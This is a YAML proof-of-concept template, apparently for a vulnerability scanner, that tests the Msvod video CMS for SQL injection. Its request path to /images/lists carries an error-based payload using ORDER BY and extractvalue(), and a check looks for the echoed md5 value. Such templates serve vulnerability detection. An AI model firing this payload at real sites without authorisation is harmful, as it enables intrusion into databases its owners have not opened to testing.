id: poc-yaml-msvod-sqli
info:
  name: Msvod SQL注入漏洞
  severity: medium
  tags:
  - sql-injection
  finger: Msvod
  reference: []
  description: null
variables:
  r1: random_int(10000, 21000)
transport: http
requests:
- method: GET
  path: /images/lists?cid=1%20)%20ORDER%20BY%201%20desc,extractvalue(rand(),concat(0x7c,md5({{.r1}})))%20desc%20--%20a
  headers: {}
  data: null
  redirect: false
  raw: null
  timeout: null
  expression: contains(body, substr(md5(r1),0,31))
  output: []
